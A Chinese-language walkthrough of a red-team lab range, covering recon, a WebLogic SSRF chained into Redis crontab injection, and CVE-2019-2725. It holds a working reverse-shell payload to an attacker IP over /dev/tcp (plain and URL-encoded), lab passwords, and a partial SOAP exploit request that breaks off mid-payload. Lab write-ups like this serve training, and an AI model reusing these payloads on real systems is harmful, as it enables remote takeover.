# ATT&CK(二)
## 环境搭建
还原一下快照
登录web主机 使用密码 de1ay 1qaz@WSX登录进去
进去之后进到这个目录下面,无权限时可以输入 管理员账号密码：Administrator/1qaz@WSX
    C:\Oracle\Middleware\user_projects\domains\base_domain\bin
以管理员身份运行
WEB机和PC机：计算机右键->管理->配置->服务->Server、Workstation、Computer Browser 全部启动（Computer
Browser 一直自动关闭导致 net view 显示 6118 error 没能解决，在域信息收集时暂时关闭一下防火墙）
## 信息收集
收集ip
    nmap -sP 192.168.111.2/24
收集80的具体信息
    nmap -sS -sV -A -T4 -p- 192.168.111.80
  * 445端口开放可能存在smb服务可能还会有ms17-010 端口溢出漏洞
  * 139端口开放就存在有samba服务可能会有远程命令执行漏洞
  * 1433端口开放就存在mssql服务有可能存在爆破 注入 sa弱口令
  * 3389远程桌面服务
  * 7001端口 weblogic服务
## 外网
### weblogic SSRF
#### 简单测试
    cd vulhub/weblogic/ssrf/
    docker-compose up -d
    docker ps
可以看到开启了连个服务 一个是weblogic 另一个是 redis
同样我们先扫描一下
我们对operator进行修改操作,发现当端口开放的时候会返回404
当端口不存在的时候就会显示服务连接不上
师傅总结的五种状态
**状态一**
**状态二**
**状态三**
**状态四**
**状态五**
首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通
定时任务payload
    set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/192.168.111.128/7777 0>&1'\n\n\n\n"
    config set dir /etc/
    config set dbfilename crontab
    save
    set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.111.128%2F7777%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave
替换%0A为%0A%0D
    strs = """set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.111.128%2F7777%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave"""
    print(strs.replace("%0A","%0A%0D"))
在拼接到redis请求之中
    http://172.18.0.2:6379/ww%0A%0D%0A%0Dset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.111.128%2F7777%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0A%0Dconfig%20set%20dir%20%2Fetc%2F%0A%0Dconfig%20set%20dbfilename%20crontab%0A%0Dsave
#### 调试分析
修改docker-compose.yml，增加8888端口映射
    vim docker-compose.yml
重启docker
    docker stop `docker ps -q`
    docker-compose up -d
查看id
    docker ps
进入容器
    docker exec -it 5891c1ca1078  bash
    cd /root/Oracle/Middleware/user_projects/domains/base_domain/bin
    vi setDomainEnv.sh
    debugFlag="true"
    export debugFlag
    DEBUG_PORT=8888
重新启动容器
    docker restart 5891c1ca1078
获取weblogic的源码
    docker cp 5891c1ca1078:/root ./weblogic_jars
将所有jar包放到一个目录下面
    mkdir weblogic_jars/lib
    find ./weblogic_jars -name *.jar -exec cp {} ./weblogic_jars/lib/ \;
idea打开下面的wlserver_10.3
添加jar包
添加 jdk
如果不行就把防护墙关了
这里呢我们要找到正确调试的位置要在反编译的class下面下断点.我们先去看看要调试那个class文件
查看一个docker的日志
    docker logs 5891c1ca1078
我们找到然后下好断点
成功接收到了
这里调试主要关注点是对于operator参数值的传递 从sendMessage函数开始，这里sendMessage接收到operator的参数值
sendMessage函数中利用BindFactory创建了一个工厂类，又创建了一个BindingInfo对象
工厂类会通过`BindingInfo`的内容来决定创建的`Bind`对象的类型
这里BindingInfo的getTransport函数默认为http11
最后工厂类创建的对象为Http11ClientBinding
通过Http11ClientBinding调用send函数来发起请求，这里可以看出直接向url参数中的地址发起连接，没有进行任何的校验。所以存在CRLF的问题
### weblogic CVE-2019-2725
#### 环境搭建
下载jdk
下载weblogic
上传上去
    tar -zxvf jdk-7u80-linux-x64.tar.gz 
    解压
记一下解压后的文件名 jdk1.7.0_80
    export JAVA_HOME=/usr/lib/jvm/jdk1.7.0_80
    export JRE_HOME=${JAVA_HOME}/jre
    export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib
    export PATH=${JAVA_HOME}/bin:$PATH
    sudo vim ~/.bashrc
    reboot
    重启一下
说明环境配好了
命令行安装
    java -jar wls1036_generic.jar -mode=console
    cd /root/Oracle/Middleware/wlserver_10.3/common/bin/
修改完之后要输入下一步
    cd /root/Oracle/Middleware/wlserver_10.3/common/lib/n/wanan
     ./startWebLogic.sh
    http://192.168.111.129:7001/_async/AsyncResponseService
访问这个目录若返回200表示漏洞存在如果返回404则不存在
    http://192.168.111.129:7001/_async/
访问这个目录若返回403表示漏洞存在,如果返回404表示漏洞不存在
利用前可以先看下有无wget命令
查看一下写到哪里/_async/AsyncResponseService?info
访问/_async/_async/AsyncResponseService
    POST /_async/AsyncResponseService HTTP/1.1
    Host: 192.168.111.129:7001
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Connection: close
    Content-Length: 851
    Accept-Encoding: gzip, deflate
    SOAPAction:
    Accept: */*
    User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
    Connection: keep-alive
    content-type: text/xml
    xx
    xx
    /bin/bash
    -c